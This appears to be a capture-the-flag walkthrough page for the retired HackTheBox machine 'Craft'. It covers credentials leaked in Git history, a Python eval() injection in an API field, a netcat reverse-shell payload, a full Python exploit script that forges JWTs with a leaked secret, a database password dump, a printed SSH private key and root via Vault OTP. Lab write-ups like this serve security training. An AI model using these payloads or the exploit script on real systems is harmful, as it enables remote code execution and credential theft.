@@ -1,0 +1,531 @@
+<!doctype html>
+<html lang="en"><!-- InstanceBegin template="/Templates/writeup.dwt" codeOutsideHTMLIsLocked="false" -->
+	<head>
+		<!-- Global site tag (gtag.js) - Google Analytics -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-41632606-2"></script>
+		<script>
+		window.dataLayer = window.dataLayer || [];
+		function gtag(){dataLayer.push(arguments);}
+		gtag('js', new Date());
+
+		gtag('config', 'UA-41632606-2');
+		</script>
+		<link rel="shortcut icon" href="../favicon/favicon.ico"/>
+		<!-- InstanceBeginEditable name="title" -->
+		<title>Sohvaxus - CTF Write-up - Craft</title>
+		<!-- InstanceEndEditable -->
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+		<script src="../typewriter.js"></script>
+		<link rel="stylesheet" type="text/css" href="../stacksec.css">
+
+		<meta charset="UTF-8">
+		<!-- InstanceBeginEditable name="description" -->
+		<meta name="description" content="Walkthrough from the retired HackTheBox.eu machine Jerry.">
+		<!-- InstanceEndEditable -->
+		<!-- InstanceBeginEditable name="keywords" -->
+		<meta name="keywords" content="hackthebox,ctf,hack,capture,the,flag,write,up,retired">
+		<!-- InstanceEndEditable -->
+		<meta name="author" content="Sohvaxus">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	</head>
+	<!-- BODY -->
+	<body>
+		<div class="container-fluid">
+			<div class="row">
+				<!-- HEADER -->
+				<div class"col">
+					<nav class="navbar navbar-inverse">
+						<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+							<span class="sr-only">Toggle navigation</span>
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+						</button>
+						<a class="navbar-brand" href="../index.html">Sohvaxus</a>
+					</nav>
+				</div>
+				<!-- END OF HEADER -->
+				<div class="col-sm-2" id="navigation">
+					<!-- NAV -->
+					<nav class="navbar navbar-default">
+						<div class="container-fluid">
+							<div class="collapse navbar-collapse" id="navbar" style="padding-right: 100px;border:none;margin-left:2%">
+								<p>General<p>
+								<ul class="nav navbar-nav">
+									<li><a href="../index.html">HOME</a></li>
+									<li><a href="../readme.html">README.TXT</a></li>
+								</ul>
+							</div>
+						</div>
+					</nav>
+					<!-- END OF NAV -->
+				</div>
+				<!-- CONTENT -->
+				<div class="col-sm-8" id="content-page">
+					<div class="container-fluid"><!-- InstanceBeginEditable name="h1" -->
+					  	<h1>Craft</h1>
+						<center><p><i>Walkthrough</i></p></center>
+					<!-- InstanceEndEditable -->
+					<hr class="solid">
+						<!-- BREADCRUMBS -->
+						<ol class="breadcrumb">
+						  	<li class="breadcrumb-item"><a href="../index.html">Home</a></li>
+							<!-- InstanceBeginEditable name="breadcrumb" -->
+						  	<li class="breadcrumb-item active">Craft</li>
+							<!-- InstanceEndEditable -->
+					    </ol>
+						<div class="row top-buffer">
+						<!-- ARTICLE CONTENT -->
+						<div class="col-sm-8">
+								<table class="table">
+									<!-- InstanceBeginEditable name="table" -->
+									<tbody>
+									  <tr>
+									    <td>OS:</td>
+									    <td><img src="../images/linux.png" alt="Craft" style="max-height:20px;max-width:20px;padding-right:5px;" class="image">Linux</td>
+								      </tr>
+									  <tr>
+									    <td>Difficulty:</td>
+									    <td>Medium</td>
+								      </tr>
+									  <tr>
+									    <td>Points:</td>
+									    <td>30</td>
+								      </tr>
+									  <tr>
+									    <td>Release:</td>
+									    <td>13 jul 2019</td>
+								      </tr>
+									  <tr>
+									    <td>IP:</td>
+									    <td>10.10.10.110</td>
+								      </tr>
+								    </tbody>
+									<!-- InstanceEndEditable -->
+								</table>
+						  </div>
+						<div class="col-sm-4">
+							<!-- InstanceBeginEditable name="image" -->
+							<center><img src="../images/craft_table.png" alt="Craft" style="max-height:200px;max-width:200px;" class="image"></center>
+							<!-- InstanceEndEditable --></div>
+						</div>
+						<p>0xL1NK#~ <a href="hackthebox.eu">HackTheBox.eu</a></p>
+						<br />
+						<!-- InstanceBeginEditable name="article" -->
+						<ol>
+							<li><h5>Description</h5></li>
+							<p>The user portion of this box revolves around the Gogs Craft API. In order to gain root we have to exploit an application called Vault. To start off i added craft.htb to my /etc/hosts file pointing to 10.10.10.110.</p>
+							<li><h5>Recon</h5></li>
+							<ol>
+								<li>Nmap</li>
+								<p>As always, we start out with some recon of the box. The default go to tool is Nmap to find open ports and their services:</p>
+								<br />
+								<p>Used command:</p>
+								<code>
+root@kali:~/Documents/htb/Craft# nmap -sC -sV -oA craft 10.10.10.110
+								</code>
+								<br />
+								<p>Output:</p>
+								<code>
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-03 08:35 CDT
+Nmap scan report for craft.htb (10.10.10.110)
+Host is up (0.028s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+| ssh-hostkey:
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+443/tcp open  ssl/http nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+|_http-title: About
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US                                                                             
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after:  2020-06-20T02:25:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+| tls-nextprotoneg:
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+								</code>
+								<br />
+								<p>For good measure, we run a full scan to find any uncommon ports:</p>
+								<br />
+								<p>Used command:</p>
+								<code>
+root@Kali:~/Documents/htb/craft# nmap -T5 -p- -oA craft-full craft.htb
+								</code>
+								<br />
+								<p>Output:</p>
+								<code>
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-03 08:35 CDT
+Warning: 10.10.10.110 giving up on port because retransmission cap hit (2).
+Nmap scan report for craft.htb (10.10.10.110)
+Host is up (0.030s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+443/tcp  open  https
+<span style="color:yellow;">6022/tcp open  x11</span>
+								</code>
+								<br />
+								<p>As we can see, port 443 (HTTPS) is open, and is running an nginx server. Also by running our full scan, we discovered a new port: 6022 for service x11.</p>
+								<br />
+								<li>Web page</li>
+								<p>Upon browsing to the webserver on port 443, we are greeted with some information about Craft. The page is quite sober and white. On the top right of the page there are two items: API and one clickable icon. API points to the URL: https://api.craft.htb/api/ and the icon points to Gogs: https://gogs.craft.htb/ . These subdomains should be added to /etc/hosts aswel, we will need them in a minute.</p>
+								<p>This is now my entry for 10.10.10.110 in /etc/hosts:</p>
+								<code>
+10.10.10.110    craft.htb api.craft.htb gogs.craft.htb
+								</code>
+								<br />
+								<p>Now that we've added these two subdomains to our /etc/hosts file, we can browse to them via our browser. When we browse to https://gogs.craft.htb/ we see a Gogs homepage. When we browse to https://api.craft.htb/api/ we see what appears to be an API we can send requests to in order to create, update and delete brews, create an authentication token and more. As we move back to https://gogs.craft.htb/ we notice some tabs at the top of the page: Home, Explore and Help. Clicking on help points us to the Gogs homepage, and clicking on Explore points us to what looks like a git page.</p>
+								<p>A common mistake developers make when it comes to Git, is that they accidentally push credentials for services when developing or debugging their code. When they realize their mistake they try to fix it by pushing the file in question again, but without the credentials to overwrite the original. Unfortunately for them Git keeps track of these changes, and saves the previous version of the file, and thus the credentials aswel. It just so happens to be that the developers of the Craft API made this mistake. After digging around the commits from the craft-api repository there is one such commit that contained credentials: https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1. If you check out this commit, we can see the developer tried to test a python script which sends a request to the craft-api on order to get an authentication token.</p>
+								<code>
+// Original code
+
+import requests
+import json
+
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
+json_response = json.loads(response.text)		
+token =  json_response['token']
+
+// Credentials
+Username : dinesh
+Password: 4aUh0A8PbVJxgd
+								</code>
+								<br />
+								<p>The good thing about these credentials is, is that now we can create an authentication token of our own to send authenticated requests to the craft-api endpoint. As you know from a little while back, we found the page https://api.craft.htb/api/ . This page has an option to generate our own authentication token.</p>
+								<center></center><img src="../images/craft/login_auth.png" style="max-height:417;max-width:1422;" class="image"></center>
+								<br />
+								<p>In order to leverage this, click on 'Try it out' -> Execute. An authentication window will pop up asking for a username and password. Enter the credentials we just found, this should give you an authentication token as such:</p>
+								<code>
+// The token, yours will probably be different.
+
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTgyNTc5NTExfQ.XFy5Tze86r52MWrMG-4wbLxc1OHI8iQ1u5foC5sEgpA"
+}
+								</code>
+								<br />
+								<p>Now that we can send authenticated requests with our authentication token, how are we gonna levarage this position in order to get a foothold? Well, after some more api related code inspection it turns out that in order to create new brews, and eval() function is called and evaluates the parameter 'abv'. Eval() is quite nasty and i should not be used in application. If user input is allowed in an eval() function it quite often leads to a command execution vulnerability. Always try to check for the use of eval().</p>
+								<code>
+// Code is found @ https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py
+
+@auth.auth_required
+@api.expect(beer_entry)
+def post(self):
+	"""
+	Creates a new brew entry.
+	"""
+
+	# make sure the ABV value is sane.
+	if <span style="color: yellow;">eval('%s > 1' % request.json['abv'])</span>:
+		return "ABV must be a decimal value less than 1.0", 400
+	else:
+		create_brew(request.json)
+		return None, 201
+								</code>
+							</ol>
+								<li><h5>Exploitation</h5></li>
+								<p>Now that we've found our injection point for command execution in the API, we can create a reverse shell back to our listener.</p>
+								<ol>
+									<li>Poppin' the shell</li>
+									<p>Since the eval() function is present in the python function that creates a new brew entry, we will leverage the craft-api endpoint once again to create a new brew:</p>
+									<center></center><img src="../images/craft/create_brew.png" style="max-height:659;max-width:1423;" class="image"></center>
+									<br />
+									<p>Click 'Try it out'. Since the parameter 'abv' is being evaluated, this parameter will be vulnerable to code injection. Change the payload so that 'abv' contains the code you want to execute on the webserver, and an id that does not exist yet. The rest can be random. Since the language this api is written in is python, your code you inject will also have to be in python.</p>
+									<code>
+// Obviously you should change the ip and port to your ip and listening port.
+										
+{
+  "id": 13,
+  "brewer": "test",
+  "name": "test",
+  "style": "test",
+  "abv": "__import__('os').system('nc 10.10.14.35 50501 -e /bin/sh') or 1>2"
+}
+									</code>
+									<br />
+									<p>As you might notice, in my payload i execute /bin/sh instead of /bin/bash. When i tried to execute it with /bin/bash my shell died instanly. This is because /bin/bash is set to nologon for the user you're trying to pop a shell as. Also, don't forget to set up a listener on your attacking machine before clicking execute on this payload.</p>
+									<code>
+nc -lvnp 50501
+									</code>
+									<br />
+									<p>Because this session expires quite fast, i wrote my own exploit which generates a login token whenever it's ran, and connects back to our listener. This exploit should be run with Python3 and requires 'jwt' which can be installed like this:</p>
+									<code>
+pip3 install pyjwt
+									</code>
+									<br />
+									<p>Next run the following code, it will ask you for your current HackTheBox ip from your attacking machine, and the port you set up your listener at.</p>
+									<code>
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import jwt
+import datetime
+import requests
+import json
+
+def create_token():
+        secret = "hz66OCkDtv8G6D"
+        token = jwt.encode({'user': 'dinesh', 'exp' : datetime.datetime.utcnow() + datetime.timedelta(minutes=5)}, secret)
+        return token
+
+def create_payload():
+        ip = input("Enter ip: ")
+        port = input("Enter port: ")
+
+        print("Creating payload...")
+        payload = "__import__('os').system('nc {} {} -e /bin/sh') or 1>2".format(ip, port)
+        brew_dict = {}
+        brew_dict['abv'] = payload
+        brew_dict['name'] = 'bogus'
+        brew_dict['brewer'] = 'bogus'
+        brew_dict['style'] = 'bogus'
+        return brew_dict
+
+def connect():
+        token = create_token()
+        headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
+        payload = create_payload()
+
+        json_data = json.dumps(payload)
+        response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
+        print(response.text)
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+connect()
+
+									</code>
+									<br />
+									<p>After executing the exploit you should have received a shell on your listener. The shell you get is not very useable, that's why i like to use a little trick i learned from Ippsec to upgrade our shell. In order to get a proper shell, follow these steps:</p>
+									<code>
+// Type in the shell
+python  -c 'import pty;pty.spawn("/bin/sh")'
+// Then do CTRL + Z
+// You will be back at the shell of your attacker machine
+// Type the following
+stty raw -echo
+// Press ENTER
+// Type 'fg' without the quotes. You will not actually see it on screen
+fg
+// Press ENTER twice
+// You should now see in which directory you are (is should be /opt/app)
+// Type:
+export TERM=xterm
+									</code>
+									<br />
+									<li>Getting user.txt</li>
+									<p>You should now have a proper shell. Let's check out what files are in our current directory.</p>
+									<code>
+/opt/app # ls -al
+total 32
+drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
+drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
+drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
+-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
+-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
+drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
+-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
+drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
+									</code>
+									<br />
+									<p>As you can see we have a few interesting files here to play with. One particularly interesting file is dbtest.py. We can execute this file, and when we do, we can see that we have permissions to query the database. dbtest.py only gets information about brews that are currently in the database, but maybe we could alter the script so it extracts user information from the database. After some trial and error i found out the there is a table called 'user' that we can dump. I created a new python script called dbtest1.py in /opt/app and altered the code from dbtest.py to the following:</p>
+									<code>
+/opt/app # cat dbtest1.py 
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                             user=settings.MYSQL_DATABASE_USER,
+                             password=settings.MYSQL_DATABASE_PASSWORD,
+                             db=settings.MYSQL_DATABASE_DB,
+                             cursorclass=pymysql.cursors.DictCursor)
+
+try:
+    with connection.cursor() as cursor:
+        <span style="color:yellow;">sql = "SELECT * FROM `user` LIMIT 20"</span>
+        cursor.execute(sql)
+	<span style="color:yellow;">result = cursor.fetchall()</span>
+        print(result)
+
+finally:
+    connection.close()
+									</code>
+									<br />
+									<p>As you can see i altered the query in the code to dump everything from the table 'user'. Also it contained a line: result = cursor.fetchone(). I looked up if there is an alternative to fetchone() to return everything instead, and not just one entry. Ofcourse there was an alternative called .fetchall(). After changing fetchone() to fetchall() i executed the script, and the following output was returned:</p>
+									<code>
+/opt/app # python dbtest1.py 
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle','password': 'ZEU3N8WNM2rh4T'}]
+									</code>
+									<br />
+									<p>We now have some extra credentials:</p>
+									<code>
+// We had Dinesh
+Username: dinesh
+Password: 4aUh0A8PbVJxgd
+										
+// New credentials
+Username: ebachman
+Password: llJ77D8QFkLPQB
+										
+Username: gilfoyle
+Password: ZEU3N8WNM2rh4T
+									</code>
+									<br />
+									<p>I tried to SSH with these credentials, but it didn't work, so there had to be another purpose for one of these credentials. After trying to sign in with these users on Gogs, i managed to sign in with as Gilfoyle. Not long after logging in on his account i noticed that he has a private repository. When taking a look in the repository i found a .ssh directory. Now this could be interesting. And as fate may have it, the .ssh directory contains Gilgoyles' private SSH key:</p>
+									<code>
+// Location @ https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
+qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
+F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
+zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
+RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
+lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
+pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
+B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
+4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
+Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
+3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
+Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
+ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
+GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
+0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
+5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
+cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
+elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
+CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
+hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
+a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
+MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
+Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
+Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
+I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
+6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
+-----END OPENSSH PRIVATE KEY-----
+									</code>
+									<br />
+									<p>I quickly took this id_rsa key and put it on my attacking machine. This key is gonna help me create an SSH connection as Gilfoyle. After copying the key to my machine, i changed the permissions and connected via SSH as Gilfoyle with his password that we got earlier (ZEU3N8WNM2rh4T):</p>
+									<code>
+// SSH connection with Gilfoyles' id_rsa
+										
+user@Kali:~/Documents/htb/craft# chmod 600 id_rsa
+user@Kali:~/Documents/htb/craft# ssh -i id_rsa gilfoyle@craft.htb
+									</code>
+									<br />
+									<p>We have now finally owned user, and can read the user flag.</p>
+									<code>
+user@Kali:~/Documents/htb/craft# ssh -i id_rsa gilfoyle@craft.htb
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Enter passphrase for key 'id_rsa': 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+gilfoyle@craft:~$ wc -c user.txt 
+33 user.txt
+
+									</code>
+									<br />
+									<li>Getting root.txt</li>
+									<p>After checking and rechecking the running processes on the server, i spotted a process that was out of the ordinary called Vault. The interesting thing is also that this process is run as root. After reading a bunch of <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords/">Vault documentation</a> it seems that there is a oneliner to get root access via Vault. After a lot of trial and error, trying different oneliners, i finally got this one working:</p>
+									<code>
+gilfoyle@craft:~$ vault ssh -role root_otp -mode otp -strict-host-key-checking=no root@127.0.0.1
+									</code>
+									<br />
+									<p>After running this command in Gilfoyles' SSH session, you should once again be asked for a password. As you can see you should also have gotten an OTP or One Time Password, enter this OTP as the password:</p>
+									<code>
+gilfoyle@craft:~$ gilfoyle@craft:~$ vault ssh -role root_otp -mode otp -strict-host-key-checking=no root@127.0.0.1
+-bash: gilfoyle@craft:~$: command not found
+gilfoyle@craft:~$ vault ssh -role root_otp -mode otp -strict-host-key-checking=no root@127.0.0.1
+Vault could not locate "sshpass". The OTP code for the session is displayed
+below. Enter this code in the SSH password prompt. If you install sshpass,
+Vault can automatically perform this step for you.
+OTP for the session is: <span style="color:yellow;">e7fee045-8357-f0f3-fb88-1eb655e150b7</span>
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password:
+root@craft:~# wc -c root.txt 
+33 root.txt
+									</code>
+									<br />
+									<p>Congratulations, your are now root on Craft! :)</p>
+								</ol>
+					 	</ol>
+						<center><b><p>** For more information, check out the extra links and sources. **</p></b></center>
+						<h5>50URC35:<h5>
+						<ul id="sources">
+							<li><a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords/">Vault documentation</a></li>
+						</ul>
+					  	<!-- InstanceEndEditable -->
+						</div>
+					</div>
+				</div>
+				<!-- END OF CONTENT -->
+				<!-- SCRIPTS -->
+				<script>
+					var elements = document.querySelectorAll('[data-chaffle]');
+					var elm = document.querySelectorAll('[data-chaffle-onLoad]');
+
+					Array.prototype.forEach.call(elements, function (el) {
+						var chaffle = new Chaffle(el)
+						el.addEventListener('mouseover', function () {
+							chaffle.init();
+						});
+					});
+
+					Array.prototype.forEach.call(elm, function (el) {
+						var chaffle = new Chaffle(el, {
+							delay: 200
+						})
+						setInterval(function(){
+							chaffle.init();
+						}, 8000)
+					});
+				</script>
+				<!-- END OF SCRIPTS -->
+			</div>
+		</div>
+	<!-- END OF BODY -->
+	</body>
+<!-- InstanceEnd --></html>
